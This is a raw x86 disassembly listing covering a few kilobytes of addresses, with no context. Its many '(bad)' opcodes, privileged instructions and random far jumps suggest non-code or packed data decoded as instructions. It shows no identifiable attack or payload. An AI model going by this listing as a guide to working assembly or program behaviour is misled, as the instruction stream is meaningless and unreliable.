  405e08:	and    al,0xfb
  405e0a:	adc    eax,0x1ed7bedb
  405e0f:	xchg   DWORD PTR [esi-0x331d0302],eax
  405e15:	dec    eax
  405e16:	(bad)  
  405e17:	mov    al,ds:0x76bb1984
  405e1c:	retf   0xe8da
  405e1f:	cmp    dl,bl
  405e21:	and    dl,ah
  405e23:	adc    esp,edi
  405e25:	shl    BYTE PTR [ecx+ebx*2-0x4d],cl
  405e29:	es in  eax,0x6
  405e2c:	aaa    
  405e2d:	mov    bl,dl
  405e2f:	retf   0xa180
  405e32:	push   0x69
  405e34:	fcomp  QWORD PTR [edi+0x23]
  405e37:	in     eax,dx
  405e38:	shr    BYTE PTR [eax+0x2b],cl
  405e3b:	or     DWORD PTR [ebx],edx
  405e3d:	add    esp,eax
  405e3f:	dec    ecx
  405e40:	fisub  DWORD PTR [esi+0x12]
  405e43:	stos   DWORD PTR es:[edi],eax
  405e44:	and    DWORD PTR [ebx],esi
  405e46:	mov    al,0xe6
  405e48:	jno    0x405dff
  405e4a:	sbb    edi,DWORD PTR [esi+ebx*8+0x5dc80b15]
  405e51:	stos   BYTE PTR es:[edi],al
  405e52:	mov    esi,fs
  405e54:	pushf  
  405e55:	stc    
  405e56:	xchg   ebx,eax
  405e57:	pop    ebp
  405e58:	sub    eax,0x18d8ba4f
  405e5d:	inc    edi
  405e5e:	jnp    0x405e7d
  405e60:	and    eax,0x17047ffd
  405e65:	(bad)  
  405e66:	rcr    DWORD PTR [ebx-0x7f],1
  405e69:	adc    cl,BYTE PTR [eax+esi*2+0x57]
  405e6d:	pop    ebp
  405e6e:	add    edi,DWORD PTR ds:0x1774c6ca
  405e74:	retf   0x9c9e
  405e77:	icebp  
  405e78:	push   es
  405e79:	push   esp
  405e7a:	or     al,0x78
  405e7c:	add    dh,bl
  405e7e:	adc    bl,al
  405e80:	in     eax,0xeb
  405e82:	mov    ecx,0xb3dc1b26
  405e87:	cmp    dh,BYTE PTR [ebx+ecx*2+0x2f]
  405e8b:	aam    0x1e
  405e8d:	js     0x405eb5
  405e8f:	mov    bh,0x95
  405e91:	mov    edx,edi
  405e93:	push   ebp
  405e94:	push   ds
  405e95:	sar    DWORD PTR ds:0xb381c759,0x11
  405e9c:	test   DWORD PTR [ecx],edi
  405e9e:	add    edx,eax
  405ea0:	xchg   esp,eax
  405ea1:	or     esi,ebp
  405ea3:	dec    ecx
  405ea4:	in     al,dx
  405ea5:	pusha  
  405ea6:	imul   DWORD PTR [eax]
  405ea8:	push   cs
  405ea9:	jp     0x405f00
  405eab:	lds    esi,FWORD PTR [edi]
  405ead:	sub    DWORD PTR [eax+0x145bb1c7],0x1c9c6182
  405eb7:	push   esp
  405eb8:	pop    esp
  405eb9:	and    BYTE PTR [edx-0x14857e7b],ah
  405ebf:	mov    esp,0x9c48fbc7
  405ec4:	pop    es
  405ec5:	xchg   edx,eax
  405ec6:	nop
  405ec7:	stc    
  405ec8:	lods   al,BYTE PTR ds:[esi]
  405ec9:	test   DWORD PTR ss:[esi],ebp
  405ecc:	sti    
  405ecd:	arpl   WORD PTR [esi],bp
  405ecf:	cli    
  405ed0:	add    ecx,DWORD PTR [edi+0x62]
  405ed3:	inc    esp
  405ed4:	inc    ebx
  405ed5:	lock jnp 0x405e93
  405ed8:	jno    0x405ed3
  405eda:	jno    0x405e73
  405edc:	mov    edi,0x7d4303ca
  405ee1:	fdivr  st,st(0)
  405ee3:	xchg   esi,eax
  405ee4:	mov    BYTE PTR [eax-0xf387df],bl
  405eea:	js     0x405f34
  405eec:	sti    
  405eed:	inc    edx
  405eee:	jg     0x405ece
  405ef0:	inc    edx
  405ef1:	fwait
  405ef2:	add    ecx,ecx
  405ef4:	sub    eax,0x72dbf68d
  405ef9:	xchg   ebx,eax
  405efa:	mov    dh,0x88
  405efc:	push   ds
  405efd:	ret    0xe4aa
  405f00:	sub    dl,ah
  405f02:	push   edi
  405f03:	sub    al,0x5
  405f05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f06:	out    dx,al
  405f07:	and    BYTE PTR [ebx-0x3c],bl
  405f0a:	lds    ecx,FWORD PTR [edx-0x7b854336]
  405f10:	xchg   ebx,eax
  405f11:	adc    BYTE PTR [ebx-0x12],bl
  405f14:	bound  edi,QWORD PTR [esi-0x7446ffa0]
  405f1a:	mov    dh,0xd8
  405f1c:	jb     0x405f73
  405f1e:	dec    edi
  405f1f:	mov    bl,BYTE PTR [eax-0x7d]
  405f22:	and    ebx,ebp
  405f24:	sub    BYTE PTR [ebp-0x4dfcacdd],0x6d
  405f2b:	add    eax,0xa9cee9c
  405f30:	stc    
  405f31:	sub    BYTE PTR [ebp+0x8],0x59
  405f35:	fst    QWORD PTR [edi]
  405f37:	(bad)  
  405f39:	enter  0x3063,0x0
  405f3d:	dec    dh
  405f3f:	sub    eax,0x77ed38ef
  405f44:	test   eax,0x1da3f146
  405f49:	jnp    0x405ef9
  405f4b:	pop    edi
  405f4c:	add    DWORD PTR [edi+0x27bcecc1],ecx
  405f52:	fwait
  405f53:	outs   dx,DWORD PTR ds:[esi]
  405f54:	adc    esp,DWORD PTR [eax]
  405f56:	xchg   ebp,eax
  405f57:	ja     0x405eea
  405f59:	sub    al,BYTE PTR [ebp-0x37]
  405f5c:	dec    ebp
  405f5d:	nop
  405f5e:	dec    edx
  405f5f:	loopne 0x405f6a
  405f61:	mov    eax,0x8dd97f8d
  405f66:	cmp    eax,0x97f03151
  405f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f6c:	or     dh,bl
  405f6e:	(bad)  
  405f6f:	out    0x77,al
  405f71:	add    cl,BYTE PTR [ebp+0x35]
  405f74:	sbb    ebp,DWORD PTR [esi-0x3]
  405f77:	dec    edi
  405f78:	pop    edx
  405f79:	mov    BYTE PTR [esi],al
  405f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f7c:	int    0x97
  405f7e:	xor    ebp,DWORD PTR [ebp-0x4de05dad]
  405f84:	fisttp DWORD PTR [ecx]
  405f86:	jecxz  0x405fc9
  405f88:	test   DWORD PTR [esi+ebp*2],esp
  405f8b:	xor    al,0x23
  405f8d:	pop    ds
  405f8e:	mov    DWORD PTR [eax-0x39055d38],ebx
  405f94:	mov    bl,BYTE PTR [ecx+0x71]
  405f97:	mov    fs,WORD PTR [ebx+eiz*4]
  405f9a:	retf   
  405f9b:	add    eax,0xc3eb5d14
  405fa0:	sub    bl,BYTE PTR [edi]
  405fa2:	xchg   edx,eax
  405fa3:	cmp    BYTE PTR [ebp-0x64d7e8e7],ch
  405fa9:	sbb    esi,esp
  405fab:	inc    edi
  405fac:	loop   0x406007
  405fae:	mov    ecx,0xb7344db4
  405fb3:	sub    DWORD PTR [ebp+0x11],0xa2fe12df
  405fba:	xchg   BYTE PTR [edx-0x18c0642c],bl
  405fc0:	and    BYTE PTR gs:[ebx+ecx*8],bh
  405fc4:	pop    esp
  405fc5:	fsubr  DWORD PTR [esp+ebp*4-0x65bfe17b]
  405fcc:	pop    edi
  405fcd:	fild   WORD PTR [edx+ebx*8]
  405fd0:	ja     0x405fc6
  405fd2:	sbb    al,0xcd
  405fd4:	lea    edx,[edx]
  405fd6:	push   ss
  405fd7:	ja     0x40600a
  405fd9:	mov    ebp,DWORD PTR [eax+0x72]
  405fdc:	pop    esi
  405fdd:	loope  0x405f7d
  405fdf:	(bad)  
  405fe0:	jg     0x405ff4
  405fe2:	mov    ch,0xab
  405fe4:	inc    ecx
  405fe5:	cmp    eax,0x6687d22c
  405fea:	mov    BYTE PTR [ecx-0x1d],ah
  405fed:	sbb    esp,DWORD PTR [eax-0x7b9c8ddc]
  405ff3:	dec    eax
  405ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ff5:	imul   esi,DWORD PTR [ecx-0x52],0xa11e9127
  405ffc:	int    0xee
  405ffe:	cmc    
  405fff:	iret   
  406000:	push   edi
  406001:	ins    DWORD PTR es:[edi],dx
  406002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406003:	sbb    ecx,DWORD PTR [ebx+edi*1+0x555613a2]
  40600a:	adc    BYTE PTR [ecx],bl
  40600c:	pop    esi
  40600d:	sbb    DWORD PTR [ecx],0x96a721de
  406013:	repz ret 0x4b01
  406017:	xchg   DWORD PTR [esi],ebx
  406019:	(bad)  
  40601a:	jp     0x405fa6
  40601c:	data16 sbb al,BYTE PTR [eax-0x743497ae]
  406023:	scas   eax,DWORD PTR es:[edi]
  406024:	ins    BYTE PTR es:[edi],dx
  406025:	mov    ds:0xc346264d,al
  40602a:	fist   WORD PTR ds:0xf9a5d30f
  406030:	mov    dh,0x69
  406032:	popf   
  406033:	out    0x67,eax
  406035:	mov    WORD PTR [edx-0x423cae45],?
  40603b:	(bad)  [ebp+0x7a]
  40603e:	call   0xad5b7e7
  406043:	loope  0x406019
  406045:	cmp    edx,ecx
  406047:	push   0x12
  406049:	sub    DWORD PTR [edx],edx
  40604b:	pop    eax
  40604c:	int3   
  40604d:	xor    ah,BYTE PTR [esi+edi*8+0x32c52050]
  406054:	inc    eax
  406055:	sub    edi,DWORD PTR [esi+edx*2+0x5d]
  406059:	(bad)  
  40605a:	push   ebp
  40605b:	push   esp
  40605c:	aad    0x25
  40605e:	loope  0x4060db
  406060:	and    eax,0x98c85897
  406065:	jno    0x4060e6
  406067:	lock mov al,bh
  40606a:	test   DWORD PTR es:[ecx-0x17],ebx
  40606e:	lock dec eax
  406070:	xchg   ebp,eax
  406071:	add    DWORD PTR [edi-0x2b],0xffffffaf
  406075:	cmp    eax,0xba3295ea
  40607a:	pusha  
  40607b:	stos   BYTE PTR es:[edi],al
  40607c:	fwait
  40607d:	gs cmc 
  40607f:	retf   0xaed
  406082:	push   ecx
  406083:	push   eax
  406084:	add    dl,ah
  406086:	jne    0x406097
  406088:	in     eax,0xea
  40608a:	or     dh,dl
  40608c:	mov    cs,WORD PTR [edi+0x41]
  40608f:	mov    ecx,DWORD PTR [esi-0x40]
  406092:	mov    ebp,0xdfbe1498
  406097:	nop
  406098:	ins    DWORD PTR es:[edi],dx
  406099:	mov    dl,0x49
  40609b:	aas    
  40609c:	mov    ebx,0xd9de2f01
  4060a1:	fsubrp st(7),st
  4060a3:	add    ebx,ebx
  4060a5:	jo     0x406082
  4060a7:	(bad)
  4060ab:	aas    
  4060ac:	sub    dh,BYTE PTR [esi+0x62]
  4060af:	dec    eax
  4060b0:	inc    edx
  4060b1:	ffreep st(1)
  4060b3:	jmp    0x40611a
  4060b5:	rcr    BYTE PTR [esi-0x7393750c],0x1f
  4060bc:	or     eax,0x1392c171
  4060c1:	stos   BYTE PTR es:[edi],al
  4060c2:	sub    ch,ah
  4060c4:	sbb    al,0xe8
  4060c6:	ss add eax,0x91547ba2
  4060cc:	aam    0xdb
  4060ce:	xchg   ecx,eax
  4060cf:	out    0xfb,eax
  4060d1:	mov    ah,0x92
  4060d3:	rcr    cl,0x23
  4060d6:	cmp    bl,bl
  4060d8:	fnstsw WORD PTR [esi+0x3bd34ce6]
  4060de:	ror    ebp,0xd
  4060e1:	xor    eax,0xd5142b3b
  4060e6:	xchg   ebp,eax
  4060e7:	mov    ebx,0x45799c31
  4060ec:	sahf   
  4060ed:	fxsave ds:0x8383a3a0
  4060f4:	sahf   
  4060f5:	out    dx,eax
  4060f6:	pop    es
  4060f7:	call   0x7dd:0xf6a8cab3
  4060fe:	test   BYTE PTR [ecx+0x3fab6fe5],0x3b
  406105:	(bad)  
  406106:	jl     0x4060f7
  406108:	inc    edi
  406109:	fiadd  WORD PTR [edx-0x1e]
  40610c:	call   0x881443d9
  406111:	fld    QWORD PTR [edx+0x63cef4dd]
  406117:	fadd   QWORD PTR [ebp-0x2dc6f302]
  40611d:	sub    ebp,DWORD PTR [ecx]
  40611f:	sar    cl,0xf2
  406122:	dec    edi
  406123:	retf   0x49bb
  406126:	out    0x60,eax
  406128:	xlat   BYTE PTR ds:[ebx]
  406129:	in     eax,0x9f
  40612b:	mov    ebx,0x8def3cc
  406130:	dec    esi
  406131:	loopne 0x40617f
  406133:	clc    
  406134:	popf   
  406135:	adc    DWORD PTR [eax],eax
  406137:	jae    0x4060ee
  406139:	cmp    ecx,DWORD PTR [esi+0x12bf70a0]
  40613f:	pop    es
  406140:	leave  
  406141:	mov    WORD PTR [ebp+esi*4-0x6bd6965d],ss
  406148:	into   
  406149:	or     eax,0x874b5ce0
  40614e:	inc    edi
  40614f:	neg    DWORD PTR [ebx+0x74]
  406152:	call   0x667c:0x9803a5cc
  406159:	call   FWORD PTR [eax+ebx*4-0x35]
  40615d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40615e:	inc    esp
  40615f:	pop    esi
  406160:	and    ebp,DWORD PTR [eax+0x1e]
  406163:	jg     0x406166
  406165:	and    BYTE PTR [edi],0xbd
  406168:	hlt    
  406169:	mov    al,0x34
  40616b:	mov    dh,0xd6
  40616d:	pop    ebp
  40616e:	mov    cl,0x7b
  406170:	or     BYTE PTR [edi-0x5f],0x54
  406174:	(bad)  
  406175:	outs   dx,DWORD PTR ds:[esi]
  406176:	in     al,dx
  406177:	test   eax,0x3ea6be29
  40617c:	or     al,0x57
  40617e:	cmp    BYTE PTR [edx+esi*4],al
  406181:	pop    ecx
  406182:	jmp    0xddad:0x1d51ad0c
  406189:	fs ret 
  40618b:	jle    0x4061a1
  40618d:	mov    ebx,DWORD PTR [edi+0x41]
  406190:	mov    ch,0x2e
  406192:	rcr    cl,cl
  406194:	add    BYTE PTR [ebx+eiz*1-0x58],cl
  406198:	(bad)  
  406199:	cmc    
  40619a:	nop
  40619b:	ficomp WORD PTR [ecx+0x3abb0b6]
  4061a1:	mov    ah,ch
  4061a3:	xchg   ebp,eax
  4061a4:	icebp  
  4061a5:	cmp    esp,ebx
  4061a7:	or     DWORD PTR [esi],esp
  4061a9:	adc    ebx,DWORD PTR [ebx+0x367ebf0c]
  4061af:	cwde   
  4061b0:	and    ecx,DWORD PTR [ebp+ebx*4-0x66]
  4061b4:	sbb    al,0xe7
  4061b6:	lods   al,BYTE PTR ds:[esi]
  4061b7:	add    DWORD PTR ds:0x620784ff,ebx
  4061bd:	add    BYTE PTR [esi+ebx*2-0x60],bl
  4061c1:	adc    eax,0x3707953c
  4061c6:	outs   dx,BYTE PTR ds:[esi]
  4061c7:	mov    eax,0xc187d77e
  4061cc:	push   ds
  4061cd:	shl    DWORD PTR [eax],0x4a
  4061d0:	adc    dl,BYTE PTR [edi+0x65]
  4061d3:	adc    DWORD PTR [esi+esi*1],ecx
  4061d6:	out    0xfd,eax
  4061d8:	mov    BYTE PTR [ebx-0x2e],ah
  4061db:	stc    
  4061dc:	push   esp
  4061dd:	das    
  4061de:	retf   
  4061df:	mov    BYTE PTR [edx+0x77],dh
  4061e2:	rcl    ebx,1
  4061e4:	push   esi
  4061e5:	mov    ah,BYTE PTR [eax]
  4061e7:	daa    
  4061e8:	stc    
  4061e9:	out    0x2e,al
  4061eb:	cmp    BYTE PTR [eax],dl
  4061ed:	arpl   WORD PTR [edx-0xa8dc958],cx
  4061f3:	adc    ebp,DWORD PTR [eax+ebx*8-0x54]
  4061f7:	sbb    eax,0x60c26423
  4061fc:	(bad)  
  4061fd:	call   0xd8c6a3d8
  406202:	cs aad 0xba
  406205:	(bad)  
  406206:	sbb    al,0x7b
  406208:	out    0x2a,eax
  40620a:	or     esi,0x8c97490b
  406210:	cmp    BYTE PTR [ebx],cl
  406212:	mov    esp,eax
  406214:	leave  
  406215:	mov    al,ds:0xcde7f464
  40621a:	in     eax,dx
  40621b:	dec    esp
  40621c:	jmp    0x6edf22d9
  406221:	mov    ecx,0x9ee47976
  406226:	not    cl
  406228:	mov    eax,0x96b5b490
  40622d:	sub    eax,0x6e797a93
  406232:	and    eax,0x3d9b321f
  406237:	dec    edx
  406238:	(bad)  
  406239:	jmp    0x4061fe
  40623b:	js     0x4062b8
  40623d:	inc    eax
  40623e:	ror    BYTE PTR [edi+esi*1+0x87375f1],1
  406245:	sbb    eax,0xb06365be
  40624a:	ret    0x697e
  40624d:	sar    BYTE PTR ds:0x7373fda6,1
  406253:	and    al,0xf5
  406255:	cmp    al,BYTE PTR [eax]
  406257:	rcl    DWORD PTR [ebp-0xf319e8f],cl
  40625d:	dec    eax
  40625e:	dec    ebp
  40625f:	bound  edx,QWORD PTR [ecx]
  406261:	test   BYTE PTR [eax],bh
  406263:	xor    BYTE PTR [ebp+0x2b17f542],al
  406269:	popf   
  40626a:	or     edx,esp
  40626c:	xchg   ebp,eax
  40626d:	and    BYTE PTR [edx],0x2a
  406270:	fidivr DWORD PTR [ebp+ecx*2+0x1465dc85]
  406277:	dec    eax
  406278:	mov    ebx,0x1eb58ee4
  40627d:	or     al,0xb3
  40627f:	mov    esi,DWORD PTR [edi+ebx*1+0x2aba5ab3]
  406286:	sub    edi,DWORD PTR [esi-0x25939770]
  40628c:	xchg   ecx,eax
  40628d:	fisttp WORD PTR [eax-0x153a9e72]
  406293:	add    DWORD PTR [ebp-0x4d],esi
  406296:	adc    esp,esi
  406298:	aaa    
  406299:	push   es
  40629a:	div    ch
  40629c:	sbb    DWORD PTR [edi],ebx
  40629e:	or     ebx,DWORD PTR [ebx+edi*2+0x73]
  4062a2:	int    0x25
  4062a4:	(bad)  
  4062a5:	mov    esi,0x1e41bb7c
  4062aa:	retf   
  4062ab:	ja     0x406297
  4062ad:	add    al,0x56
  4062af:	sub    ah,BYTE PTR [edx]
  4062b1:	ret    0x9279
  4062b4:	cmp    cl,BYTE PTR fs:[edx]
  4062b7:	sbb    DWORD PTR [edi],eax
  4062b9:	inc    edi
  4062ba:	(bad)  
  4062bb:	jp     0x4062c0
  4062bd:	push   esi
  4062be:	jae    0x406308
  4062c0:	fisub  DWORD PTR [edi]
  4062c2:	fld    DWORD PTR [edx-0x63ed4227]
  4062c8:	rol    BYTE PTR [ebx+0x28],cl
  4062cb:	jbe    0x4062e2
  4062cd:	push   0xc4405a4a
  4062d2:	mov    ebx,0xdf162c92
  4062d7:	or     dl,0x57
  4062da:	lods   al,BYTE PTR ds:[esi]
  4062db:	jmp    0x40633b
  4062dd:	fcomp  st(2)
  4062df:	stos   BYTE PTR es:[edi],al
  4062e0:	es dec edx
  4062e2:	outs   dx,BYTE PTR ds:[esi]
  4062e3:	push   ds
  4062e4:	fild   DWORD PTR [ebp+eiz*2-0x4e]
  4062e8:	xchg   esp,ecx
  4062ea:	cmp    al,0xed
  4062ec:	adc    BYTE PTR [eax+0x3ee03ad],0xe7
  4062f3:	sub    BYTE PTR [eax+edx*2-0x5c77fdb1],cl
  4062fa:	or     al,0x25
  4062fc:	add    al,0x70
  4062fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062ff:	cwde   
  406300:	pop    ebx
  406301:	dec    edx
  406302:	mov    ebx,0x6830dc2b
  406307:	push   esi
  406308:	pop    esp
  406309:	and    BYTE PTR [ebx-0x48],ch
  40630c:	fs and al,0x7d
  40630f:	jbe    0x406310
  406311:	test   BYTE PTR [edx+0x7dc87863],bh
  406317:	pop    ebx
  406318:	jno    0x4062fc
  40631a:	pop    edx
  40631b:	fld1   
  40631d:	or     al,0xc9
  40631f:	jmp    0x8dfd:0xfdd3c8aa
  406326:	dec    edi
  406327:	sbb    cl,BYTE PTR [eax-0x6167a74a]
  40632d:	lods   al,BYTE PTR ds:[esi]
  40632e:	jno    0x406375
  406330:	icebp  
  406331:	enter  0xd7b5,0x69
  406335:	imul   edi,DWORD PTR [esi+eiz*1+0x48],0x6b
  40633a:	sub    eax,0x63ba9cbf
  40633f:	test   al,0x1a
  406341:	adc    edi,ebp
  406343:	xchg   esp,eax
  406344:	pop    edx
  406345:	cmp    DWORD PTR [ebp+0x3a],eax
  406348:	fadd   QWORD PTR [eax-0x4b8f6e89]
  40634e:	scas   al,BYTE PTR es:[edi]
  40634f:	or     al,0x9f
  406351:	inc    edx
  406352:	jo     0x4063bc
  406354:	aam    0xb9
  406356:	enter  0xc9cd,0xda
  40635a:	push   0x74cb3b27
  40635f:	adc    al,bl
  406361:	sti    
  406362:	mov    ebx,0x6215b723
  406367:	jmp    0x2b69:0x2e2f2925
  40636e:	and    bl,bl
  406370:	pop    esp
  406371:	lea    ecx,[edi-0x735c09cc]
  406377:	jb     0x40635f
  406379:	out    dx,al
  40637a:	or     al,0xd5
  40637c:	jecxz  0x4063ba
  40637e:	adc    al,0x64
  406380:	push   ebp
  406381:	and    ch,BYTE PTR [esi-0x5c45b0f5]
  406387:	retf   
  406388:	pop    es
  406389:	xchg   edx,eax
  40638a:	fisttp DWORD PTR [ebx]
  40638c:	mov    bl,0x70
  40638e:	lahf   
  40638f:	or     edi,DWORD PTR [ebp-0xf110382]
  406395:	es mov cl,0xf3
  406398:	pushf  
  406399:	xor    BYTE PTR [edi-0x1d],bl
  40639c:	push   esi
  40639d:	data16 loope 0x40638c
  4063a0:	fdiv   DWORD PTR [esi]
  4063a2:	adc    DWORD PTR [esi],ebx
  4063a4:	pop    eax
  4063a5:	shl    BYTE PTR [ebx+0x38],0x49
  4063a9:	pop    edx
  4063aa:	call   0x31a6:0x743f2971
  4063b1:	arpl   WORD PTR [esi],sp
  4063b3:	stos   BYTE PTR es:[edi],al
  4063b4:	sbb    esi,DWORD PTR ds:0x6a8298fc
  4063ba:	shl    BYTE PTR [edx-0x2178bd9f],cl
  4063c0:	nop
  4063c1:	(bad)  
  4063c3:	in     al,dx
  4063c4:	imul   eax,ecx,0xc3e0f183
  4063ca:	inc    ebp
  4063cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063cc:	jmp    0xea4f:0x62831802
  4063d3:	arpl   WORD PTR [ecx-0x33],cx
  4063d6:	popf   
  4063d7:	rcr    DWORD PTR [ecx-0x1a],1
  4063da:	cmp    eax,0x58bd8c16
  4063df:	stc    
  4063e0:	sti    
  4063e1:	inc    edi
  4063e2:	jno    0x4063c9
  4063e4:	repz xor ah,BYTE PTR ds:0xb8c36674
  4063eb:	push   edi
  4063ec:	test   BYTE PTR [edx+0x2f],0x9f
  4063f0:	mov    edi,0x6044e49b
  4063f5:	fcmovnbe st,st(1)
  4063f7:	xor    DWORD PTR [edx+0x18],ebx
  4063fa:	or     eax,0x3e951b3
  4063ff:	sbb    edi,edi
  406401:	retf   0x3d49
  406404:	cdq    
  406405:	or     al,0xbb
  406407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406408:	xor    bl,cl
  40640a:	dec    esp
  40640b:	popf   
  40640c:	xor    DWORD PTR [eax+0x49],eax
  40640f:	adc    DWORD PTR [ecx+0x6424c26f],0xb9ab6a21
  406419:	push   ecx
  40641a:	mov    edi,0xb4d67691
  40641f:	mov    esi,0x49b9ef07
  406424:	ret    
  406425:	xchg   ebx,eax
  406426:	mov    ds:0xd81c9169,eax
  40642b:	leave  
  40642c:	xchg   ebx,eax
  40642d:	hlt    
  40642e:	clc    
  40642f:	int    0x2c
  406431:	cli    
  406432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406433:	sub    al,0xb4
  406435:	mov    ebp,es
  406437:	mov    eax,0xe5bb70da
  40643c:	jmp    0x9c324aaf
  406441:	and    eax,0x39753504
  406446:	or     BYTE PTR [ecx],ch
  406448:	(bad)  [ebp-0x45]
  40644b:	aam    0x54
  40644d:	fisttp DWORD PTR [edx]
  40644f:	cld    
  406450:	(bad)  [ebp+ebp*8-0x45bd1994]
  406457:	call   0x8b00:0x67c9d592
  40645e:	xchg   esi,eax
  40645f:	aam    0x22
  406461:	jmp    0xe466:0x7c7e7d3b
  406468:	sub    bh,dh
  40646a:	int    0x84
  40646c:	sbb    DWORD PTR [edx],eax
  40646e:	ficom  WORD PTR [eax+eax*2+0x1f3843ba]
  406475:	jmp    0xd5a3ecd3
  40647a:	out    0x39,al
  40647c:	js     0x40642a
  40647e:	jno    0x40647e
  406480:	in     al,dx
  406481:	pop    ds
  406482:	test   esp,edx
  406484:	sbb    BYTE PTR [ebx+0x52b90ba5],ah
  40648a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648b:	loopne 0x406424
  40648d:	hlt    
  40648e:	and    edx,esp
  406490:	adc    eax,0x5b90dfa8
  406495:	or     eax,0x297726a4
  40649a:	stos   BYTE PTR es:[edi],al
  40649b:	fwait
  40649c:	or     eax,0xfe63d8da
  4064a1:	call   0x85e7a6b8
  4064a6:	mov    ebx,0x462f947d
  4064ab:	mov    ch,0x76
  4064ad:	movq   mm6,QWORD PTR [ecx-0x35ab818a]
  4064b4:	loope  0x40644b
  4064b6:	add    BYTE PTR [edx+0x48cd651b],cl
  4064bc:	pop    edx
  4064bd:	mov    dl,0xc8
  4064bf:	jl     0x406497
  4064c1:	sub    DWORD PTR [ecx],esi
  4064c3:	mov    esp,0x4845198c
  4064c8:	scas   eax,DWORD PTR es:[edi]
  4064c9:	into   
  4064ca:	or     DWORD PTR [ebx-0x1cf985a5],ecx
  4064d0:	mov    ebp,0x10d7040a
  4064d5:	les    ebp,FWORD PTR [edi+0x7]
  4064d8:	dec    edi
  4064d9:	dec    DWORD PTR [esi-0x698fda5d]
  4064df:	xchg   BYTE PTR [esi+eiz*4+0x67fe8b3e],bh
  4064e6:	fcomp  QWORD PTR [edi]
  4064e8:	cmp    eax,0x9e53727b
  4064ed:	xor    ch,BYTE PTR [edi-0x60]
  4064f0:	dec    ebp
  4064f1:	imul   ebp,DWORD PTR fs:[esi+0x4e7ebab3],0x44b72a6c
  4064fc:	pop    esp
  4064fd:	jmp    0x5d38:0xd0e883b4
  406504:	sub    DWORD PTR [ecx+0x45e6370],eax
  40650a:	jp     0x40656e
  40650c:	xchg   edi,eax
  40650d:	lods   al,BYTE PTR ds:[esi]
  40650e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40650f:	out    0x63,eax
  406511:	push   eax
  406512:	mov    al,ch
  406514:	sbb    al,0x62
  406516:	rol    ecx,1
  406518:	ins    DWORD PTR es:[edi],dx
  406519:	push   0xc
  40651b:	jmp    DWORD PTR [eax-0x24]
  40651e:	retf   
  40651f:	jne    0x4064fc
  406521:	in     eax,dx
  406522:	inc    esp
  406523:	push   eax
  406524:	sub    ch,ah
  406526:	pandn  mm5,QWORD PTR [ebp-0x2358aca0]
  40652d:	jno    0x406516
  40652f:	jecxz  0x4064ec
  406531:	pop    ebp
  406533:	mov    eax,0x3cc931f9
  406538:	test   al,0x56
  40653a:	push   ss
  40653b:	test   al,0x82
  40653d:	push   esp
  40653e:	bound  esi,QWORD PTR [ebx]
  406540:	xchg   ecx,eax
  406541:	mov    cl,al
  406543:	jl     0x406569
  406545:	adc    esi,0xffffffe3
  406548:	mov    cl,0xec
  40654a:	cmp    eax,0x8e879b54
  40654f:	jmp    0x4065af
  406551:	push   ecx
  406552:	sub    esp,DWORD PTR [ecx+edx*8-0x2a]
  406556:	das    
  406557:	xchg   esi,eax
  406558:	paddw  mm0,QWORD PTR [ebp-0x3e]
  40655c:	mov    edx,0x98c1e164
  406561:	push   esp
  406562:	sub    ecx,DWORD PTR [ebx+0x36]
  406565:	jb     0x40653f
  406567:	inc    ecx
  406568:	ret    
  406569:	mov    cl,0xa5
  40656b:	cmp    ebx,edi
  40656d:	xchg   esi,eax
  40656e:	mov    dl,0xa1
  406570:	js     0x4065ad
  406572:	jae    0x40659b
  406574:	xchg   ecx,eax
  406575:	stos   DWORD PTR es:[edi],eax
  406576:	ficomp DWORD PTR [edi]
  406578:	mov    bl,0x1a
  40657a:	mov    dh,0x55
  40657c:	mov    ds:0xdf9c4e79,eax
  406581:	sti    
  406582:	inc    edx
  406583:	or     al,dl
  406585:	jne    0x4065d7
  406587:	loop   0x40659d
  406589:	aas    
  40658a:	in     eax,0xfc
  40658c:	pop    ebx
  40658d:	daa    
  40658e:	test   al,0xff
  406590:	xlat   BYTE PTR ds:[ebx]
  406591:	imul   ebp,esi,0x5ec2c7b5
  406597:	sbb    eax,0xab474f75
  40659c:	sub    bl,BYTE PTR [eax+0x46]
  40659f:	jns    0x4065c0
  4065a1:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a3:	(bad)  
  4065a4:	repnz inc esp
  4065a6:	xchg   edi,eax
  4065a7:	pop    ebp
  4065a8:	(bad)  
  4065a9:	and    BYTE PTR [ebx],dl
  4065ab:	out    dx,al
  4065ac:	sar    edi,cl
  4065ae:	dec    edx
  4065af:	add    eax,0xab6d621
  4065b4:	rol    BYTE PTR [esi+0x5a57f786],1
  4065ba:	cwde   
  4065bb:	leave  
  4065bc:	or     al,0xf1
  4065be:	mov    edi,0x87f9801e
  4065c3:	mov    ch,0x9b
  4065c5:	jns    0x406560
  4065c7:	push   0xb13b85a
  4065cc:	(bad)  [esi]
  4065ce:	test   al,0xc
  4065d0:	mov    dl,0x2d
  4065d2:	cli    
  4065d3:	lods   eax,DWORD PTR ds:[esi]
  4065d4:	add    ebx,DWORD PTR [ecx+0x1d]
  4065d7:	pop    ebx
  4065d8:	sbb    ebp,edi
  4065da:	push   edi
  4065db:	(bad)  
  4065dc:	jl     0x406631
  4065de:	pop    esi
  4065df:	and    bh,BYTE PTR [ecx-0x28]
  4065e2:	mov    ecx,0x2a000aa
  4065e7:	or     esi,edi
  4065e9:	cmp    edx,DWORD PTR [edx+0x6932518d]
  4065ef:	shl    BYTE PTR [edx-0x17],0x9b
  4065f3:	aas    
  4065f4:	fist   WORD PTR [edx-0x19]
  4065f7:	mov    BYTE PTR [esi+esi*2+0x46],al
  4065fb:	fnsave [eax+0x1e]
  4065fe:	cli    
  4065ff:	call   0x33ea3482
  406604:	jns    0x406679
  406606:	sbb    eax,0xac5dd015
  40660b:	mov    ds:0x84fd7b64,al
